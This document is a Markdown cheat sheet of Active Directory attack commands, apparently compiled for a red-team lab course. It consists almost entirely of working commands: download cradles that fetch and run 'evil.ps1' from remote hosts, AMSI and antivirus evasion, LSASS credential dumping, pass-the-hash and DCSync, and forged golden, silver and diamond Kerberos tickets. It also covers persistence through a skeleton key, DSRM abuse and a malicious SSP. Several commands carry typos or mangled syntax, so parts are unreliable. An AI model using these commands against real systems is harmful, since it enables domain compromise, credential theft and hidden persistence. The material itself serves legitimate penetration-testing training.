# Active Directory Attacks

## Powershell

### Load a Powershell Script

#### Dot Sourcing

```powershell
. C:\AD\Tools\PowerView.ps1
```

#### Import-Module

```powershell
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

#### List commands in a Module

```powershell
Get-Command -Module <modulename>
```
#### Execute Download Cradle

##### IEX

```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')

```

##### IE

```powershell
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
````

##### PSv3 Onwards - IEX & IWR

```powershell
iex (iwr 'http://192.168.230.1/evil.ps1')
```

##### h

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
```

##### iwr

```powershell
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```
##### Cradle Crafter

https://github.com/danielbohannon/Invoke-CradleCrafter

##### Bypass Execution Policy

https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy

### Bypass Powershell Security

#### Invisi-Shell

https://github.com/OmerYa/Invisi-Shell

##### Invisi-Shell with Admin Privileges

```powershell
RunWithPathAsAdmin.bat
```

##### Invisi-Shell with Non-Admin Privileges

```powershell
RunWithRegistryNonAdmin.bat
```

#### Bypassing AV Signatures

##### AMSITrigger

https://github.com/RythmStick/AMSITrigger

###### AMSITrigger Usage

```powershell
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
```

##### DefenderCheck

https://github.com/t3hbb/DefenderCheck

###### DefenderCheck Usage

```powershell
DefenderCheck.exe PowerUp.ps1
```

##### Full Obfuscation

https://github.com/danielbohannon/Invoke-Obfuscation

##### ProtectMyTooling

https://github.com/mgeeky/ProtectMyTooling

##### Beating Signature Detection

1. Scan using AMSITrigger
2. Modify the detected code snippet
3. Rescan using AMSITrigger
4. Repeat steps 2 & 3 untill result = "AMSI_RESULT_NOT_DETECTED" or "blank"

____________________________

## Domain Enumeration

### Tools for Enumeration

#### Active Directory PowerShell Module

https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps

https://github.com/samratashok/ADModule

```powershell
Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
```
```powershell
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

#### BloodHound

https://github.com/BloodHoundAD/BloodHound

#### PowerView (PowerShell)

https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1

```powershell
. C:\AD\Tools\PowerView.ps1
```

#### SharpView (C#)

https://github.com/tevora-threat/SharpView/

#### Additional Tools

https://janikvonrotz.ch/2015/09/09/deploy-powershell-activedirectory-module-without-installing-the-remote-server-tools/

https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html

### Powerview

#### Domain Enumeration 
##### Get Current Domain
```powershell
Get-Domain
```
##### Get Another Domain
```powershell
Get-Domain -Domain moneycorp.local
```
##### Get Current DomainSID
```powershell
Get-DomainSID
```
##### Get Domain Policy for the current Domain
```powershell
Get-DomainPolicyData
```
```powershell
(Get-DomainPolicyData).systemaccess
```
##### Get Domain Policy for Another Domain
```powershell
(Get-DomainPolicyData -Domain moneycorp.local).systemaccess
```
##### Get Domain Controller for the Current Domain
```powershell
Get-DomainController
```
##### Get Domain Controller for Another Domain
```powershell
Get-DomainController -Domain moneycorp.local
```

#### User Enumeration
##### Get a List of Users in the Current Domain
```powershell
Get-DomainUser
```
```powershell
Get-DomainUser -Identity student1
```
##### Get List of All Properties for Users in the Current Domain
```powershell
Get-DomainUser -Identity student1 -Properties *
```
```powershell
Get-DomainUser -Properties samaccountname,logonCount
```
##### Search User Attributes
```powershell
Get-DomainUser -LDAPFilter "Description-"*built*" | Select name, Description
```
##### Get Actively Logged Users on a Computer (Needs Local Admin on the Target)
```powershell
Get-NetLoggedon -ComputerName dcorp-adminsrv
```
##### Get Locally Logged Users on a COmputer (Needs Remote Registryon the Targer - started by default on Server OS)
```powershell
Get-LoggedonLocal -ComputerName dcorp-adminsrv
```
##### Get the Last Logged User on a Computer (Needs Admin Rights and Remote Registry on the Targer)
```powershell
Get-LastLoggedON -ComputerName dcorp-adminsrv
```

#### Computer Enumeration
##### Get a List of COmputers in the Current Domain
```powershell
Get-DomainComputer | Select Name
```
```powershell
Get-DomainComputer -OperatingSystem "*Server 2022*"
```
```powershell
Get-DomainComputer -Ping
```

#### Group Enumeration
##### Get All the Groups in the Current Domain
```powershell
Get-DomainGroup | Select Name
```
```powershell
Get-DomainGroup -Domain <target_domain>
```
##### Get All Groups Containing the Word "admin" in the Group Name
```powershell
Get-DomainGroup *admin*
```
##### Get All the Members of the Domain Admins Group
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
##### Get the Group Membership for a User
```powershell
Get-DomainGroup -username "student1"
```
##### Get the Local Groups on a Machine (Need Admin Privs on Non-DC machines)
```powershell
Get-NetLocalGroup -ComputerName dcorp-dc
```
##### Get Members of the Local Group "Administrators" on a Machines (Needs Admin Privs on Non-DC Machines)
```powershell
Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
```

#### File and Share Enumeration
##### Find Shares on Hosts in Current Domain
```powershell
Invoke-ShareFinder -Verbose
```
##### Find Sensitive Files on COmptuers in the Domain
```powershell
Incoke-FileFinder -Verbose
```
##### Get all FileServers of the Domain
```powershell
Get-NetFileServer
```

#### Group Policy Object - GPO
##### Get List of GPO in Current Domain
```powershell
Get-DomainGPO
```
```powershell
Get-DomainGPO -ComputerIdentity dcorp-student1
```
##### Get GPO(s) which use Restricted Groups or Groups.xml for Interesting Users
```powershell
Get-DomianGPOLocalGroup
```
##### Get Users Which Are in a Local Group of a Machine Using GPO
```powershell
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity dcop-student1
```
##### Get Machines Where the Given User is a Member of a Specific Group
```powershell
Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
```

#### Organizational Unit - OU
##### Get OUs in the Domain
```powershell
Get-DomainOU
```
##### Get GPO applied on an OU. Read GPOName from gplink attribute from Get-NetOU
```powershell
Get-DomainGPO -Identity {"<gplink>"}
```

#### Access Control List - ACL

https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-model

https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces

##### Get the ACLs Associated with the Specified Object
```powershell
Get-DomainObjectAVC -SamAccountName student1 -ResolbedGUIDs
```
##### Get the ACLs Associated with the Specified Prefix to be Used for Search
```powershell
Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs Verbose
```
##### Search for Interesting ACEs
```powershell
Find-InterestingDomainAcl -ResolveGUIDs
```
#####Get the ACLs Associated with the Specified Path
```powwershell
Get-PathAcl -Path "\\dcorp-dc.dollarcorp.money.local\sysvol"
```

#### Domain Trusts

https://learn.microsoft.com/en-us/entra/identity/domain-services/concepts-forest-trust

https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc773178(v=ws.10)

##### Domain Trust Mapping
```powershell
Get-DomainTrust
```
```powershell
Get-DomainTrust -Domain us.dollarcorp.moneycorp.local
```
##### Forest Mapping
```powershell
Get-Forest
```
```
Get-Forest -Forest eurocorp.local
```
##### Get All Domains in the Current Forest
```powershell
Get-ForestSomain
```
```powershell
Get-ForestDomain -Forest eurocorp.local
```
##### Get All Global Catalogs for the Current Forest
```powwershell
Get-ForestGlobalCatalog
```
```powershell
Get-ForestGlobalCatalog -Forest eurocorp.local
```
##### Map Trusts of a Forest
```powershell
Get-ForestTrust
```
```powershell
Get-ForestTrust -Forest eurocorp.local
```

#### User Hunting
##### Find All the Machines in the Curreent Domain where the Current User has Local Admin Access
```powershell
Find-LocalAdminAccess -Verbose
```
This function queries the DC of the Current or Provided Domain for a List of Computers (Get-NetComputer_ and then uses multi-threaded Invoke-CheckLocalAdminAccess on each machine.

Try: Find-WMILocalAdminAccess.ps1 & Find-PSRemotingLocalAdminAccess.ps1 if RPC and SMB ports are blocked.

##### Find Computers where a Domain Admin (or specified user/group) has sessions
```powershell
Find-DomainUserLocation -Verbose
```
```powershell
Find-DomainUserLocation -UserGroupIdentity "RDPUsers"
```

This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using Get-DomainGroupMember, Gets a list of computers (Get-DomainComputer) and lists sessions and logged on users (Get-Netsession/Get-NetLogged on) from each machine.

From Server 2019 and onward, local admin privs are required to list sessions.

##### Find Computers Where a Domain Admin Session is Available and Current User has Admin Access (Uses Test-AdminAccess)
```powershell
Find-DomainUserLocation -CheckAccess)
```
##### Find Computers (File Servers and Distributed File Servers) where a Domain Admin has a session available
```powershell
Find-DomainUserLocation -Stealth
```

##### Find Sessions on Remote Machines

https://github.com/Leo4j/Invoke-SessionHunter

```powershell
Invoke-SessionHunter -FailSafe
```

The Above Command does not require Admin Access on Remote Machines, Uses Remote Registry and queries HKEY_USERS hive.

OPSEC-friendly command:
```powershell
Invoke-SessionHunter -NoPortScan -Targets C:\AD\Tools\servers.txt
```

____________________
## Local Privilege Escalation

### Tools
#### PowerUP

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

#### Privesc

https://github.com/enjoiz/Privesc

#### winPEAS

https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

### Services Issues
#### PowerUp - Services with Unquoted Paths and a Space in the Name
```powershell
Get-ServiceUnquoted -Verbose
```
#### PowerUp - Get Services where the Current User can write to its Binary Path or Change Arguments to the binary
```powershell
Get-ModifiableServiceFile -Verbose
```
#### Get User Modifiable Service Configuration
```powershell
Get-ModifiableService -Verbose
```

### Invoke ALL checks
#### PowerUp
```powershell
Invoke-AllChecks
```
#### Privesc
```powershell
Invoke-PrivEsc
```
#### PEASS-ng
```powershell
winPEASx64.exe
```

### Feature Abuse

#### Jenkins

With admin access navigate to:

http://<jenkins_server>/scripts

In the script console, Groovy Scripts can be Executed

```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

_______________
## Domain Enumeration - Bloodhound

### Bloodhound Legacy

https://github.com/BloodHoundAD/BloodHound

### Bloodhound CE

https://github.com/SpecterOps/BloodHound

### Data Collectors
```powershell
. C:\AD\Tools\BloodHound-master\Collectors\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
```
or
```powershell
sharphound.exe
```
### Data Collectors -Stealth
```powershell
Invoke-BloodHound -Stealth
```
or
```powershell
SharpHound.exe --Stealth
```
or to avoid MDI
```powershell
Invoke-BloodHound -ExcludeDCs
```

_______________
## Lateral Movement
### Powershell Remoting
#### One-to-One - Useful Commands
```powershell
New-PSSession
```
```powershell
Enter-PSSession
```
#### One-to-Many - Useful Commands
```powershell
Invoke-Command
```
#### Execute Commands or Scriptblocks
```powershell
Invoke-Command -scriptblock {Get-Process} -ComputerName (Get-Content (<list_of_servers>)
```
#### Execute Scripts from Files
```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHasses.ps1 -ComputerName (Get-Content <list_of_servers>)
```
#### Execute Locally Loaded Functions on Remote Machines
```powershell
Invoke-Command -scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
```
#### Pass Arguments to the Function
```powershell
Invoke-Command -scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
```
#### Function Call Within the Script
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers)
#### Execute Stateful Commands
```powershell
$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

### WinRS

https://github.com/bohops/WSMan-WinRM

#### winrs - Evade Logging
```powershell
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
```

### Invoke-Mimikatz
#### Dump Credentials on a local machine using Mimikatz
```powershell
InvokeMimikatz -Command '"sekurlsa::ekeys"'
```
#### Dump Credentials using SafetyKatz
```powershell
safetykatz.exe "sekurlsa::ekeys"
```
#### Dump Credentials Using SharpKatz
```powershell
sharpkatz.exe -Command ekeys
```
#### Dump Credentials using Dumpert
```powershell
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll.Dump
```
#### Dump Credentials Using pypykatz
```powershell
pypykatz.exe live lsa
```
#### Using comsvc.dll
```powershell
tasklist /FI "IMAGENAME eq lsass.exe" rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
```

### OverPass-The-Hash - OPTH
#### OPTH - Invoke-Mimikatz
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe
```
#### OPTH - SafetyKatz.exe
```powershell
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
```
#### OPTH - Rubeus - Elevation? Not Needed.
```powershell
Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
```
#### OPTH - Rubeus - Elevation? Needed.
```powershell
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### DCSync
#### DCSync - Invoke-Mimikatz - By default DA Privs Required
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```
#### DCSync - Safetykatz
```powershell
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```
__________________

## Persistance
### Golden Ticket
#### Invoke-Mimikatz
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```
#### SafetyKatz.exe
```powershell
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```
Golden Ticket on any machine that has connectivity with DC
```powershell
\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
#### Rubeus
```powershell
\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 
```
```powershell
C:\AD\Tools\Rubeus.exe golden /aes256:154CB6624B1D859F7080A6615ADC488F09F92843879B3D914CBCB5A8C3CDA848 /user:Administrator /id:500 /pgid:513 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /pwdlastset:"11/11/2022 6:33:55 AM" /minpassage:1 /logoncount:2453 /netbios:dcorp /groups:544,512,520,513 /dc:DCORP-DC.dollarcorp.moneycorp.local /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD /ptt
```

### Silver Ticket
#### BetterSafetyKatz
```powershell
C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
```
#### Rubeus
```powershell
C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

### Diamond Ticket
#### Rubeus
```powershell
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /user:studentx /password:StudentxPassword /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
```powershel
Rubeus.exe diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp- dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### Skeleton Key
#### Invoke-Mimikatz
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
```powershell
Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
```
```powershell
privilege::debug
!+
!processprotect /process:lsass.exe /remove
misc::skeleton
!-
```

### Directory Services Restore Mode - DSRM
#### Invoke-Mimikatz - Dump DSRM Password
```powershell
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam' -ComputerName dcorp-dc
```
```powershell
Enter-PSSession -Computername dcorp-dc
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
```
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'
ls \\dcorp-dc\C$
```

### Custom Security Support Provider - SSP
#### Drop mimilib.dll to System32 & add to HKLM\SYSTEM\CurrentControlSet\Control\lsa\Security Packages
```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages' $packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```
#### Invoke-Mimikatz
```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```
All Local Logons on the DC are logged to

C:\Windows\system32\mimilsa.log



